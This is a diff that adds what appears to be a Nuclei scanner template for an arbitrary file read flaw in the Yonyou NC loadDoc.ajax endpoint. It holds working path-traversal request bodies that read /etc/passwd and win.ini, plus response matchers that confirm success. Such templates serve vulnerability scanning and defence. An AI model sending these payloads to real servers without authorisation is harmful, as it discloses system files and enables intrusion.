@@ -1,0 +1,48 @@
+http:
+    - body: ws=../../../../../../../../etc/passwd%00
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+      matchers:
+        - status:
+            - 200
+          type: status
+        - regex:
+            - 'root:.*:0:0:'
+          type: regex
+      matchers-condition: and
+      method: POST
+      path:
+        - '{{BaseURL}}/uapws/loadDoc.ajax'
+    - body: ws=../../../../../../../../Windows/win.ini%00
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '[fonts]'
+            - '[extensions]'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: POST
+      path:
+        - '{{BaseURL}}/uapws/loadDoc.ajax'
+id: yonyou-nc-loaddoc-file-read
+info:
+    author: onewin
+    description: |
+        用友NC系统的loadDoc.ajax接口存在路径遍历漏洞，攻击者可读取服务器任意文件
+    name: 用友NC - loadDoc.ajax 任意文件读取漏洞
+    reference: UFIDA-2025-060942
+    severity: high
+    tags:
+        - 用友-U8
+        - 用友-NC-Cloud
+        - Yonyou-UFIDA-NC
+        - Yonyou-U8-Cloud
+        - 用友-nc
+        - Yonyou-UFIDA
